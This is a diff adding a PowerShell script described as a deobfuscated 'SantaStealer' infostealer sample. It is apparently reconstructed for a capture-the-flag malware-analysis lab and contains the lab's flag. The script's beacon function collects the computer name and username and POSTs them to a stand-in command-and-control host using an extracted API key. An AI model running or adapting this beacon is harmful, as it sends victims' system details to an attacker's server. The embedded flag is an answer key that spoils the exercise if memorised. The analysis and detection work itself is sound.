@@ -1,0 +1,30 @@
+# SantaStealer.ps1 - DEOBFUSCATED & CLEAN VERSION
+# Reconstructed by [Your Name] - January 2026
+# Purpose: Behavioral analysis and signature development
+
+# Extracted C2 Configuration
+$C2Url = "http://c2.evil-bunny.local/api"
+$ApiKey = "CANDY-CANE-API-KEY"  # Deobfuscated from XOR 0x37 hex
+
+function Test-Beacon {
+    $Payload = @{
+        hostname = $env:COMPUTERNAME
+        user = $env:USERNAME
+        timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
+    }
+    try {
+        Invoke-WebRequest -Uri "$C2Url/beacon" -Method POST -Body ($Payload | ConvertTo-Json) -ContentType "application/json" -Headers @{ "X-API-Key" = $ApiKey }
+        Write-Output "[+] Beacon sent successfully - THM{C2_De0bfuscation_29838}"
+    }
+    catch {
+        Write-Output "[-] Beacon failed"
+    }
+}
+
+function Initialize-Exfiltration {
+    Test-Beacon
+    # Additional exfil logic redacted
+}
+
+# Entry point
+Initialize-Exfiltration
